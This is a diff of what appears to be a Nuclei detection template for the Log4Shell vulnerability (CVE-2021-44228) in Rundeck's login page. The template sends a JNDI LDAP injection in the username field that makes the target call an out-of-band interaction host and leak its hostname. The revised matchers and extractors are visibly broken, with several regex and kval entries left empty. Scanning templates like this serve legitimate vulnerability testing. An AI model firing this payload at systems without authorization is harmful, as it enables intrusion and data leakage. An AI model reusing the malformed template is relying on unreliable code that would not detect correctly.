@@ -15,9 +15,13 @@ info:
     cve-id: CVE-2021-44228
     cwe-id: CWE-77
   metadata:
+    verified: true
+    max-request: 1
     shodan-query: title:"Rundeck"
-    verified: "true"
   tags: cve,cve2021,rce,jndi,log4j,rundeck,kev,oast
+variables:
+  rand1: '{{rand_int(111, 999)}}'
+  rand2: '{{rand_int(111, 999)}}'
 
 http:
   - raw:
@@ -29,32 +33,37 @@ http:
         Connection: close
         Referer: {{BaseURL}}/user/login
 
-        j_username=${jndi:ldap://${sys:os.name}.{{interactsh-url}}}&j_password=admin
+        j_username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.postdata.{{interactsh-url}}}&j_password=admin
 
     matchers-condition: and
     matchers:
       - type: word
-        part: interactsh_protocol  # Confirms the DNS Interaction
+        part: interactsh_protocol # Confirms the DNS Interaction
         words:
           - "dns"
-
-      - type: regex
-        part: interactsh_request
-        regex:
-          - '([a-zA-Z0-9.-]+).([a-z0-9]+).([a-z0-9]+).\w+'  # Match for extracted ${sys:os.name} variable
 
       - type: word
         part: location
         words:
           - '{{BaseURL}}/user/error'
 
+      - type: regex
+        part: interactsh_request
+        regex:
+
+
     extractors:
       - type: kval
         kval:
-          - interactsh_ip # Print remote interaction IP in output
+
 
       - type: regex
+        group: 2
+        regex:
         part: interactsh_request
+
+      - type: regex
         group: 1
         regex:
-          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'  # Print extracted ${sys:os.name} in output
+        part: interactsh_request
+# digest: 490a00463044022020defcd8f7f383804a17173a074cb4ebd11b9bc3c8d4930c5e8badb6f7cc321f0220357d28b5ebfd939931bbf7cd46d967502b4b413fd2baace17de76787303b3d25:922c64590222798bb761d5b6d8e72950
